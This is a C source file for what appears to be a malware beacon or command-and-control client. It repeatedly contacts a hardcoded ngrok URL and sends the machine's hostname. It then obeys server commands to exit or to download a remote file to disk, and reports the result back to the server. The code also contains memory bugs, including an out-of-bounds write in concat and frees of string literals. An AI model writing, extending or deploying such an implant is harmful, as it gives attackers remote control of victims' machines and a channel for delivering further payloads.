#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <curl/curl.h>
#include "downloader/downloader.h"
#include "requests/http_request.h"

#ifndef _WIN32
#include <sys/utsname.h>
static inline void Sleep(unsigned int ms){sleep(ms / 1000);}
#endif


#define URL "https://allegedly-great-shiner.ngrok-free.app"


size_t callback(char *buffer, size_t itemsize, size_t nitems, void *userdata);
char *parse_response(char *command);
char *get_uname(int size_);
char *concat(const char *a, const char *b);

int main(){
	size_t resp_size;
	char *response;
	char *out = NULL;
	char *new_url = NULL;
	while (1){
		response = NULL;
		resp_size = 0;
		if (out == NULL){
			http_get(URL, get_uname(25), &response, &resp_size);
		} else {
			new_url = concat(URL, out);
			http_get(new_url, get_uname(25), &response, &resp_size);
			free(new_url);
			free(out);
			out = NULL;
			new_url = NULL;
		}
		if (response){
			out = parse_response(response);
		} else {
			printf("No data recieved\n");
		}
		Sleep(5000);
	}
	free(response);
	return 0;
}

char *concat(const char *a, const char *b){
	size_t al = strlen(a);
	size_t bl = strlen(b);
	size_t netl = sizeof(char) * (al + bl + 1);
	char *res = (char *)malloc(netl);
	strcpy(res, a);
	strcat(res, b);
	res[netl] = '\0';
	return res;
}

char *get_uname(int size_){
	char *u_name = (char *)malloc(sizeof(char) * size_);
#ifdef _WIN32
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);

	if (GetComputerName(computerName, &size)) {
		strncpy(u_name, computerName, size_);
	} else {
		printf("Failed to get system name on Windows.\n");
	}
#else
	struct utsname name;
	if (uname(&name) != -1) {
		strncpy(u_name, name.nodename, size_);
	} else {
		perror("uname failed on Linux/POSIX");
	}
#endif
	return u_name;
}

#define PUSH_PREFIX "<PUSH>@"
#define PUSH_PREFIX_LEN (sizeof(PUSH_PREFIX) - 1)

char *parse_response(char *command){
	if (strcmp(command, "<TERMINATE>") == 0){
		exit(0);
	} else if (strncmp(command, PUSH_PREFIX, PUSH_PREFIX_LEN) == 0){
		const char *download_url = command + PUSH_PREFIX_LEN;
		printf("%s\n", download_url);
		if (download_file(download_url, "download.out") == 0){
			return "/?m=Download_successful";
		} else {
			return "/?m=Dowload_Failed";
		}
	}else {
		printf("%s\n", command);
	}
	return NULL;
}
